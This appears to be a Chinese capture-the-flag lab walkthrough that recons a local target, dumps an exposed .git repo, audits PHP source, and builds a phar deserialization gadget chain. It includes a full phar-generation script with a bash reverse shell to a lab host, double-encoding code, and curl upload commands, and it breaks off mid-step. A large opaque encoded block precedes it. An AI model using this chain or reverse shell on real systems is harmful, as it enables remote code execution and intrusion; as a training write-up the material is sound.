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-->
-<!--/encrypt-->
-遇到问题先自己解决。
+# 信息收集
+
+拿到靶机，先确定 IP 并扫端口。
+
+```bash
+IP=192.168.205.199
+nmap -p0-65535 $IP
+```
+
+只开了 22 和 80。Apache/2.4.67 on Debian。没什么花头，直接看 Web。
+
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+访问 80 端口，一个简单的登录页面，标题写着 "import recovery"。随手试了 `admin:admin`，直接进去了。
+
+登录后的页面有三个功能模块：
+
+- **submit failed task** — 提交一段 blob 文本，返回一个 32 位 hex 的 ID
+- **repair task** — 输入那个 32 hex ID，后台会"修复"并生成一个 `.bin` 文件
+- **check archive** — 输入文件路径，尝试读取
+
+先随便玩了一下 check archive，想试试能不能读 `/etc/passwd`，结果返回 `not reasonable`。试了各种路径穿越、php filter、phar wrapper，全部被挡。我当时在这上面花了不少时间，各种编码绕过都试了，后来才意识到这条路黑盒是走不通的，得拿到源码才行。
+
+回过头来跑了一下目录扫描。
+
+```bash
+dirsearch -q -u http://$IP
+```
+
+扫出来一个 `.git` 目录，完整暴露。这就不用猜了，直接拖源码。
+
+# 源码还原
+
+```bash
+git-dumper http://$IP/ /tmp/src
+```
+
+`git-dumper` 在 checkout 阶段报了个错，因为 `.git` 结构有点怪，但 pack 文件已经下回来了。手动解包：
+
+```bash
+mkdir -p /tmp/unpack && cd /tmp/unpack
+git init -q
+cp /tmp/src/.git/objects/pack/*.pack .
+git unpack-objects < pack-*.pack
+GIT_DIR=$PWD/.git git cat-file --batch-check --batch-all-objects
+```
+
+一共 11 个对象，两个 tree、一个 commit、八个 blob。逐个 `cat-file -p` 导出，拿到完整源码结构：
+
+```
+config.php
+index.php
+class/Files.class.php
+class/Task.class.php
+class/User.class.php
+class/Myerror.class.php
+```
+
+# 源码审计
+
+## 路由和存储
+
+`index.php` 是个简易前端控制器，路由白名单只有三组：User(login/logout)、Task(submit/repair)、Files(read)。
+
+`config.php` 定义了存储路径：
+
+```php
+const QUARANTINE = '/var/labdata/quarantine';
+const ARCHIVE    = '/var/labdata/archive';
+```
+
+submit 把 blob 原样写入 `quarantine/<id>.txt`，repair 读出来做一次 `rawurldecode` 后写入 `archive/<id>.bin`。这意味着：如果我提交时把二进制 payload 做好 URL 编码，repair 就能还原出原始字节。因为 PHP POST 解析本身也会 urldecode 一次，所以实际需要**双重编码**。
+
+## Files::read 的时序漏洞
+
+这是整个 RCE 链的入口。`read()` 方法里：
+
+```php
+self::$inWorker = true;
+try {
+    $contents = @file_get_contents($this->filename);
+} finally {
+    self::$inWorker = false;
+}
+$this->filter();
+```
+
+`file_get_contents` 在 `filter()` 之前执行。filter 会拦截 `://`、`../`、`/` 开头、`zip`、`flag` 等关键字，但拦截发生在读取之后。如果传入 `phar://` 路径，虽然最终会被 filter 拦下输出 `not reasonable`，但 phar 反序列化已经在 `file_get_contents` 内部触发了。
+
+## 反序列化 Gadget 链
+
+四个类里的魔术方法刚好能串成一条链：
+
+**User::\_\_destruct** — 调用 `$this->password[0]->{$this->password[1]}($this->username)`，相当于对任意对象调任意方法。
+
+**User::check** — 方法体是 `echo $obj;`，会触发对象的 `__toString`。
+
+**Myerror::\_\_toString** — 返回 `(string) $this->message->{$this->level}`，访问不存在的属性会触发 `__get`。
+
+**Files::\_\_get** — 核心 sink：
+
+```php
+public function __get($key) {
+    if (self::$inWorker && ...) {
+        ($key)($this->arg);
+    }
+}
+```
+
+当 `$inWorker` 为 true 时，直接把属性名当函数名调用。设置 `$this->level = 'system'`、`$this->arg = '反弹shell命令'`，就能 RCE。
+
+串起来就是：
+
+```
+User1::__destruct
+  → User2->check(Myerror对象)
+    → echo Myerror → Myerror::__toString
+      → Files->system → Files::__get('system')
+        → system($cmd)
+```
+
+## inWorker 时序问题
+
+phar 反序列化发生在 `file_get_contents` 内部（`$inWorker = true`），但 metadata 里创建的对象直到请求结束才析构，那时候 `finally` 已经把 `$inWorker` 重置成 false 了。`Files::__get` 里的检查会失败。
+
+解法是利用 PHP 反序列化数组时的**重复键覆盖**行为。构造 metadata 为：
+
+```php
+$meta = 'a:2:{i:0;' . serialize($user1) . 'i:0;N;}';
+```
+
+数组键 `i:0` 出现两次，第二个值（`N;` = null）覆盖掉第一个（User1 对象）。被覆盖的 User1 立即失去引用，PHP 会在反序列化过程中就调用它的 `__destruct`。此时还在 `file_get_contents` 调用栈里，`$inWorker` 依然为 true。
+
+# 初始突破
+
+## 生成 phar payload
+
+在 Kali 上创建工作目录，写 PHP 脚本生成 phar 文件：
+
+```bash
+mkdir -p /tmp/exp && cd /tmp/exp
+```
+
+把下面内容保存为 `mk.php`：
+
+```php
+<?php
+class User { public $username; public $password; }
+class Files { public static $inWorker = false; public $filename; public $arg;
+    public function __get($key){
+        if(self::$inWorker && is_string($key) && preg_match('/^[A-Za-z_]\w*$/',$key)){
+            ($key)($this->arg);
+        }
+        return '';
+    }
+}
+class Myerror { public $message; public $level;
+    public function __toString(){
+        return (string)$this->message->{$this->level};
+    }
+}
+
+$cmd = 'bash -c "bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"';
+
+$f = new Files();
+$f->arg = $cmd;
+
+$e = new Myerror();
+$e->message = $f;
+$e->level = 'system';
+
+$u2 = new User();
+$u1 = new User();
+$u1->username = $e;
+$u1->password = [$u2, 'check'];
+
+$normal = serialize($u1);
+$meta = 'a:2:{i:0;' . $normal . 'i:0;N;}';
+
+@unlink('/tmp/exp/x.phar');
+$p = new Phar('/tmp/exp/x.phar', 0, 'x.phar');
+$p->startBuffering();
+$p->setStub("<?php __HALT_COMPILER(); ?>\r\n");
+$p->setSignatureAlgorithm(Phar::SHA1);
+$p->setMetadata('AAAAPLACEHOLDER_METADATA_AAAA');
+$p->addFromString('a.txt', 'x');
+$p->stopBuffering();
+
+$data = file_get_contents('/tmp/exp/x.phar');
+$ph = serialize('AAAAPLACEHOLDER_METADATA_AAAA');
+$pos = strpos($data, $ph);
+$lenpos = $pos - 4;
+$mlpos = strpos($data, "\r\n") + 2;
+$oldman = unpack('V', substr($data, $mlpos, 4))[1];
+
+$before = substr($data, 0, $lenpos);
+$after = substr($data, $pos + strlen($ph));
+$newdata = $before . pack('V', strlen($meta)) . $meta . $after;
+$delta = strlen($meta) - strlen($ph);
+$newdata = substr($newdata, 0, $mlpos) . pack('V', $oldman + $delta) . substr($newdata, $mlpos + 4);
+
+$body = substr($newdata, 0, -28);
+$sig = sha1($body, true);
+$final = $body . $sig . pack('V', 2) . 'GBMB';
+file_put_contents('/tmp/exp/evil.phar', $final);
+echo strlen($final) . "\n";
+```
+
+这里的做法是先用 Phar 类正常生成一个 phar 文件，metadata 放一个占位字符串，然后在二进制层面把占位替换成构造的恶意序列化字符串，最后重算 SHA1 签名。直接 `setMetadata` 没法产生重复数组键，只能手工改字节。
+
+执行生成 phar：
+
+```bash
+php -d phar.readonly=0 /tmp/exp/mk.php
+ls -la /tmp/exp/evil.phar
+```
+
+确认文件生成成功。
+
+## 双重编码
+
+用 Python 对 phar 文件做两次 URL 编码，保存为 `enc.py` 执行：
+
+```python
+import urllib.parse
+d = open('/tmp/exp/evil.phar','rb').read()
+a = urllib.parse.quote(d, safe='')
+b = urllib.parse.quote(a, safe='')
+open('/tmp/exp/body.txt','w').write(b)
+```
+
+```bash
+python3 /tmp/exp/enc.py
+```
+
+做个验证，确认双重解码能还原出原始 phar：
+
+```python
+import re
+def dec(s):
+    return re.sub(r'%([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1),16)), s).encode('latin-1')
+b = open('/tmp/exp/body.txt').read()
+a = dec(b).decode('latin-1')
+r = dec(a)
+o = open('/tmp/exp/evil.phar','rb').read()
+print(r == o)
+```
+
+输出 `True`，没问题。
+
+## 上传并触发
+
+登录拿 cookie：
+
+```bash
+curl -s -c cookie.txt -d 'username=admin&password=admin' "http://$IP/"
+```
+
+submit 上传 phar：
+
+```bash
+ID=$(curl -s -b cookie.txt --data "blob=$(cat /tmp/exp/body.txt)" "http://$IP/?c=Task&m=submit" | grep -oE '[a-f0-9]{32}')
+echo "ID=$ID"
+```
+
+curl 的 `--data` 把 body.txt 的内容放在 POST body 里，PHP 收到后自动 urldecode 一次（第一次解码），存入 `quarantine/<id>.txt`。
+
+repair 触发第二次解码：
+
+```bash
